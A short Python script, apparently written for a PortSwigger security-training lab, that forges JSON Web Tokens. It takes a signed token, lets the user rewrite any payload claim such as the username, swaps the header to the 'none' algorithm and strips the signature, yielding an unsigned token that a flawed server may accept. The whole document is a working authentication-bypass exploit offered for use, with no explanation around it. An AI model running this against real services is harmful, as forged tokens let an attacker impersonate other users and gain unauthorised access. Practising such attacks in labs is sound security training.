import jwt
import json

def modify_payload(jwt_payload):
    try:
        decoded_payload = jwt.utils.base64url_decode(jwt_payload).decode()
        payload_data = json.loads(decoded_payload)

        print("Current Payload:")
        print(json.dumps(payload_data, indent=2))

        key_to_edit = input("Enter the key you want to edit: ")
        new_value = input(f"Enter the new value for '{key_to_edit}': ")

        payload_data[key_to_edit] = new_value

        modified_payload = jwt.utils.base64url_encode(json.dumps(payload_data).encode()).decode()
        return modified_payload

    except Exception as e:
        print(f"Error modifying payload: {e}")
        return None

def modify_jwt(jwt_token):
    # Split the token into header, payload, and signature
    header, payload, _ = jwt_token.split('.')

    # Modify the payload
    modified_payload = modify_payload(payload)
    if modified_payload is None:
        return None

    # Modify the header to use the 'none' algorithm
    modified_header = jwt.utils.base64url_encode('{"alg":"none","typ":"JWT"}'.encode()).decode()

    # Set the signature to 'null'
    modified_token = f'{modified_header}.{modified_payload}.'

    return modified_token

# Your original JWT
original_jwt = 'eyJraWQiOiJmZjVlMDBjNS02N2JjLTRhNTItOWNmOS1lMzhiMDA2YzVjNjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTcwNTc5Mzk3NX0.Qq_CepSPZ5AEDKIiVZQySdVlBc7xU48p7EZtKMcjzSV9BKTWJLggIoBGMwQhkMjTFbt_EtMc_WBOw0uz7bJyNnh7-J767_omQb6kji_Qfa_-nrcPP9Lrez9oRiW8JQSV0ApqXo6Xsp3Vwca-RQFinVVRLfnZLA0Zv9qJ9vK69_ERloxqLetO27fMPv7ULyyC5MMcBIELXNGPGem9NsX74Kr6IQLDVCWh86O5f7yVBdKl5wfKrmnOoEJnV2U3wCGImkO2Y7D2TWvwSOx5SZFMuRs1EWHjGCOQx5MIdlKqxcVA8NwoIX1_LJbqbtfYtJn6fPziS3lbkv7ynLNnQGcQrA'

# Modify the JWT
modified_jwt = modify_jwt(original_jwt)

if modified_jwt:
    print('\nOriginal JWT:', original_jwt)
    print('Modified JWT:', modified_jwt)
